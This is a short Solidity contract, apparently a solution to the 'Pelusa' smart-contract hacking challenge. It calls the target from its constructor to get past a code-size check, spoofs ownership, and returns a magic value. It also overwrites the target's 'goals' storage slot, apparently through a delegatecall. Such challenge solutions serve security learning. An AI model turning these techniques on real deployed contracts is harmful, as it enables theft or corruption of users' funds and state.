// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IPelusa {
    function passTheBall() external;

    function shoot() external;

    function owner() external returns (address);
}

contract PelusaAttack {
    address internal player;

    uint256 public goals = 1;

    address public pelusaOwner;
    IPelusa private pelusa;

    constructor(address _pelusaAddr, address _pelusaOwner) {
        pelusa = IPelusa(_pelusaAddr);
        pelusaOwner = _pelusaOwner;

        pelusa.passTheBall();
    }

    function getBallPossesion() external returns (address) {
        return pelusaOwner;
    }

    function handOfGod() external returns (bytes32) {
        goals = 2;
        return bytes32(uint256(22_06_1986));
    }
}
